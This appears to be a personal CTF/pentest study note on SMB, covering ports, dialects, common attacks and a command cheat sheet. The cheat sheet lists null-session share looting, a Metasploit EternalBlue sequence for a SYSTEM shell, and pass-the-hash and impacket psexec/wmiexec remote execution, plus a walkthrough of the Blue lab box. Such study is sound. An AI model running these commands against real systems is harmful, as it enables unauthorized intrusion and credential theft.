## What is it

SMB (Server Message Block) is Windows' primary protocol for **file/printer sharing and inter-process comms over the network**. It's how Windows machines share folders, talk to domain controllers, and do a huge chunk of Active Directory plumbing. Samba is the Linux implementation of the same protocol.

It's _the_ Windows attack surface. Foothold, lateral movement, and AD enumeration all lean on SMB heavily. If you see a Windows box, SMB is almost always the first thing you poke.

Default ports:

- **445** — SMB directly over TCP (modern, the one that matters)
- **139** — SMB over NetBIOS (legacy, often still open)
- **137/138** — NetBIOS name/datagram (UDP, older)

Dialects: SMBv1 (ancient, insecure, EternalBlue lives here), SMBv2, SMBv3 (encryption, current).

---
## What it does

- **File shares** — exposes directories as named shares (`C$`, `ADMIN$`, `IPC$`, plus custom ones)
- **Null sessions** — older/misconfigured servers allow **anonymous** connections that can still enumerate shares, users, groups
- **Authentication** — NTLM / Kerberos; creds can be password, or **just the NTLM hash** (pass-the-hash)
- **RPC over SMB** — `IPC$` share carries named pipes used for remote admin, service control, registry, etc. (basis for `psexec`-style execution)
- **AD backbone** — in a domain, SMB carries a ton of the enumeration surface (users, shares, GPOs)
- Admin shares (`C$`, `ADMIN$`) — hidden shares that map to the filesystem/Windows dir, accessible with admin creds

---
## Common Attacks

1. **Anonymous / null-session enumeration** — Connect with no creds (`-u '' -p ''`) and list shares, users, password policy, domain info. Misconfigured servers leak a ton this way. First recon move on any SMB target.
2. **MS17-010 (EternalBlue)** — SMBv1 remote kernel exploit. Unauthenticated RCE as SYSTEM against unpatched Windows (Vista→2016, classic on Win7/2008). The NSA-leaked bug behind WannaCry/NotPetya. If SMBv1 is on and the box is old, this is the first thing to test. (See [[MS17-010 (EternalBlue)]].)
3. **Guest/weak-cred share access** — Shares left readable by `guest` or weak creds often hold configs, scripts, backups, creds, `Groups.xml` (GPP passwords). Loot everything readable.
4. **Pass-the-Hash** — You don't need the plaintext. An NTLM hash is enough to authenticate (`-H <hash>`) and, with admin rights, get code execution (`psexec`, `wmiexec`, `smbexec`).
5. **Credentialed RCE (psexec-family)** — With local-admin creds/hash, drop into a SYSTEM shell via the `IPC$`/service-control path. `impacket-psexec`, `wmiexec`, `smbexec`, `crackmapexec ... -x`.
6. **AD enumeration pivot** — In a domain, authenticated SMB access feeds share hunting, user enumeration, and BloodHound collection. SMB is the on-ramp to the whole AD attack chain.

---
## Detection

- **Ports 445 and/or 139 open** — dead giveaway it's a Windows/Samba host.
- **445 + 135 + 139** together = classic Windows fingerprint (135 is RPC endpoint mapper).
- nmap OS detection saying Windows 7 / Server 2008 → **immediately think SMBv1 / EternalBlue**.
- `nmap --script smb-protocols` — shows which SMB dialects are enabled. **SMBv1 present = EternalBlue candidate.**
- `nmap --script smb-os-discovery` — leaks OS version, hostname, domain, sometimes uptime.
- After a shell: `net share`, `Get-SmbShare` (PS), `ss -tlnp | grep 445`.

---
## Payloads/reckon/crack

**Enumerate protocols + OS (do this FIRST — decides your whole approach):**

```bash
nmap --script smb-protocols,smb-os-discovery,smb-security-mode -p 139,445 <target>
# SMBv1 enabled + old Windows -> EternalBlue candidate
```

**Enumerate shares (anonymous / null session):**

```bash
smbclient -L //<target>/ -N                    # -N = no password
crackmapexec smb <target> -u '' -p ''          # null session
crackmapexec smb <target> -u '' -p '' --shares
enum4linux-ng -A <target>                       # kitchen-sink enum
nmap --script smb-enum-shares,smb-enum-users -p 445 <target>
```

**Connect to a share:**

```bash
smbclient //<target>/<share> -N                # anonymous
smbclient //<target>/<share> -U 'user%password'
# inside: ls, get <file>, cd, recurse ON; prompt OFF; mget *
```

**Check MS17-010 (EternalBlue):**

```bash
nmap --script smb-vuln-ms17-010 -p 445 <target>
# or via Metasploit auxiliary/scanner:
# use auxiliary/scanner/smb/smb_ms17_010
```

**Exploit EternalBlue (Metasploit):**

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target>
set LHOST <tun0>
run
# -> SYSTEM shell
```

> The MSF module auto-checks vulnerability before firing, and gives you a Meterpreter shell that translates `ls/cd/cat` for you. (See [[Metasploit]].)

**Credentialed / pass-the-hash execution:**

```bash
crackmapexec smb <target> -u <user> -p <pass>              # validate creds
crackmapexec smb <target> -u <user> -H <NTLMhash>          # pass-the-hash
impacket-psexec <domain>/<user>:<pass>@<target>            # SYSTEM shell
impacket-wmiexec <domain>/<user>:<pass>@<target>           # quieter, no service
crackmapexec smb <target> -u <user> -p <pass> -x 'whoami'  # one-off command
```

> `psexec` drops a service (noisy, logged). `wmiexec`/`smbexec` are stealthier. For CTFs, whatever pops first.

**Real example ([[Blue]]):**

- nmap: ports 135/139/445 open, OS = **Windows 7 Pro SP1**. Old Windows + SMB = instant EternalBlue suspicion.
- Ran `smb-enum-shares` to enumerate, confirmed SMBv1-era target.
- MS17-010 is _the_ known kill for unpatched Win7 — no clever chain needed, it's a history/pattern box.
- Fired `exploit/windows/smb/ms17_010_eternalblue` in Metasploit → module self-verified vuln → **SYSTEM shell straight up**. Grabbed user + root flags together.
- Lesson: **old Windows version in nmap = check SMBv1 + MS17-010 before anything else.** The "how did the writeup know from just the version?" answer is exactly that pattern — Win7/2008 SP-level is the tell.